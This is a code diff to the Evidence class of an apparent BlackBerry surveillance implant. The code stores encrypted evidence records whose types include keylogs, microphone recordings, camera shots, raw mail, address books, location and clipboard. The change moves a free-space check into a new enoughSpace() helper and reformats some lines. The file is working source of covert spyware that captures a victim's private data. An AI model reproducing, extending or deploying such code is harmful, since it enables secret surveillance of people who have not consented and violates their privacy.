@@ -16,6 +16,7 @@ import java.util.Vector;
 import javax.microedition.io.Connector;
 import javax.microedition.io.file.FileConnection;
 
+import net.rim.device.api.system.DeviceInfo;
 import net.rim.device.api.util.DataBuffer;
 import blackberry.Device;
 import blackberry.agent.Agent;
@@ -70,13 +71,20 @@ public final class Evidence {
 
     public static final int EVIDENCE_MAGIC_CALLTYPE = 0x0026;
 
-    public static final int[] TYPE_EVIDENCE = new int[] { EvidenceType.INFO,
-            EvidenceType.MAIL_RAW, EvidenceType.ADDRESSBOOK,
+    public static final int[] TYPE_EVIDENCE = new int[] {
+            EvidenceType.INFO,
+            EvidenceType.MAIL_RAW,
+            EvidenceType.ADDRESSBOOK,
             EvidenceType.CALLLIST, // 0..3
-            EvidenceType.DEVICE, EvidenceType.LOCATION, EvidenceType.CALL,
+            EvidenceType.DEVICE,
+            EvidenceType.LOCATION,
+            EvidenceType.CALL,
             EvidenceType.CALL_MOBILE, // 4..7
-            EvidenceType.KEYLOG, EvidenceType.SNAPSHOT, EvidenceType.URL, EvidenceType.CHAT, // 8..b
-            EvidenceType.MAIL, EvidenceType.MIC, EvidenceType.CAMSHOT, EvidenceType.CLIPBOARD, // c..f
+            EvidenceType.KEYLOG, EvidenceType.SNAPSHOT,
+            EvidenceType.URL,
+            EvidenceType.CHAT, // 8..b
+            EvidenceType.MAIL, EvidenceType.MIC, EvidenceType.CAMSHOT,
+            EvidenceType.CLIPBOARD, // c..f
             EvidenceType.NONE, EvidenceType.APPLICATION, // 10..11
             EvidenceType.NONE // 12
     };
@@ -89,6 +97,8 @@ public final class Evidence {
     //#endif
 
     boolean firstSpace = true;
+
+    boolean enoughSpace = true;
 
     /**
      * Convert type log.
@@ -267,6 +277,14 @@ public final class Evidence {
             additionalLen = additionalData.length;
         }
 
+        enoughSpace = enoughSpace(onSD);
+        if (!enoughSpace) {
+            //#ifdef DEBUG
+            debug.trace("createEvidence, no space");
+            //#endif
+            return false;
+        }
+
         final Vector tuple = evidenceCollector.makeNewName(this, onSD);
         //#ifdef DBC
         Check.asserts(tuple.size() == 5, "Wrong tuple size");
@@ -306,20 +324,6 @@ public final class Evidence {
                 close();
                 //#ifdef DEBUG
                 debug.fatal("It should not exist:" + fileName);
-                //#endif
-
-                return false;
-            }
-
-            final long available = fconn.availableSize();
-            if (available < MIN_AVAILABLE_SIZE) {
-                close();
-                //#ifdef DEBUG
-                if (firstSpace) {
-                    firstSpace = false;
-
-                    debug.fatal("not enough space: " + available);
-                }
                 //#endif
 
                 return false;
@@ -366,13 +370,35 @@ public final class Evidence {
             //#endif
             return false;
         }
-        
+
         //#ifdef DBC
-        Check.ensures(os != null,
-                "null os");
+        Check.ensures(os != null, "null os");
         //#endif
 
         return true;
+    }
+
+    private boolean enoughSpace(boolean onSD) {
+        long free = 0;
+        if (onSD) {
+            free = Path.freeSpace(Path.SD);
+        } else {
+            free = Path.freeSpace(Path.USER);
+        }
+
+        if (free < MIN_AVAILABLE_SIZE) {
+            //#ifdef DEBUG
+            if (firstSpace) {
+                firstSpace = false;
+
+                debug.fatal("not enough space. Free : " + free);
+            }
+            //#endif
+
+            return false;
+        } else {
+            return true;
+        }
     }
 
     // pubblico solo per fare i test
@@ -413,8 +439,10 @@ public final class Evidence {
                 "Wrong log len");
         //#endif
 
-        final int headerLen = baseHeader.length + evidenceDescription.additionalData
-                + evidenceDescription.deviceIdLen + evidenceDescription.userIdLen
+        final int headerLen = baseHeader.length
+                + evidenceDescription.additionalData
+                + evidenceDescription.deviceIdLen
+                + evidenceDescription.userIdLen
                 + evidenceDescription.sourceIdLen;
         final byte[] plainBuffer = new byte[Encryption
                 .getNextMultiple(headerLen)];
@@ -487,11 +515,11 @@ public final class Evidence {
         Check.asserts(plainBuffer.length >= 32 + additionalLen,
                 "Short plainBuffer");
         //#endif
-        
+
         // buffer completo
         byte[] buffer = new byte[additionalData.length + data.length + 8];
         DataBuffer databuffer = new DataBuffer(buffer, 0, buffer.length, false);
-        
+
         // scriviamo la dimensione dell'header paddato
         databuffer.writeInt(plainBuffer.length);
         // scrittura dell'header cifrato
@@ -605,7 +633,8 @@ public final class Evidence {
 
     public static void info(final String message) {
         try {
-            final Evidence logInfo = new Evidence(Agent.AGENT_INFO, false, Encryption.getKeys().getAesKey());
+            final Evidence logInfo = new Evidence(Agent.AGENT_INFO, false,
+                    Encryption.getKeys().getAesKey());
 
             logInfo.createEvidence(null);
             logInfo.writeEvidence(message, true);
